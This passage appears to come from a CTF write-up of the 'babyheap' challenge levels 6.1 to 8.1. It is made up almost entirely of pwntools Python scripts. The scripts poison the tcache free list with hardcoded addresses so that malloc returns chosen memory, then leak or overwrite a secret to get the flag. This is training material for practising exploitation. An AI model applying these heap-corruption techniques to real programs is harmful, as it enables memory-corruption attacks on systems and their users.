</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level6.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x00426926</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> puts(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>send_flag(p, key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-70">level 7.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level7.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x00426966</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, key)
</span></span><span style="display:flex;"><span>send_flag(p, key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-71">level 7.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level7.1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x00427335</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, key)
</span></span><span style="display:flex;"><span>send_flag(p, key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-80">level 8.0</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;/challenge/babyheap_level8.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>free(p, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, p64(<span style="color:#ae81ff">0x428d00</span>))
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>malloc(p, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>scanf(p, <span style="color:#ae81ff">1</span>, key)
</span></span><span style="display:flex;"><span>send_flag(p, key[:<span style="color:#ae81ff">0x10</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="level-81">level 8.1</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">malloc</span>(p, index, size):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;free&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scanf</span>(p, index, payload):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;scanf&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">puts</span>(p, index):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_flag</span>(p, key):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;quit): &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;send_flag&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Secret: &#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(key)
